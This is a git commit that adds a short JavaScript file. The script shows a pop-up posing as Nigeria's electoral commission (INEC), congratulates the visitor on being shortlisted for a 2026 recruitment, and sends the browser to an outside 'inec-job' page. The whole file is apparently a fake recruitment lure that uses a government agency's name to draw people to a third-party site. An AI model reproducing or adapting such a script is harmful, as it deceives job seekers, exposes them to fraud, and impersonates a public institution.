89bb81b24bdef4c2bf0753308119c3ddb817d1cb
mfednewblog8 <nsikakimoh68@gmail.com>
2026-02-22 05:50:02 +0100

    Create inec-active.js

---
+++ inec-active.js
@@ -0,0 +1,5 @@
+var password = 'SUBMIT APPLICATION'
+password=prompt('INEC: Congratulations, You are among the shortlisted candidates for INEC recruitment 2026... Click Ok to submit application now','SUBMIT APPLICATION');
+if (password != 'SUBMIT APPLICATION') {
+location.href='https://ibaidad.com/inec-job.html';
+}
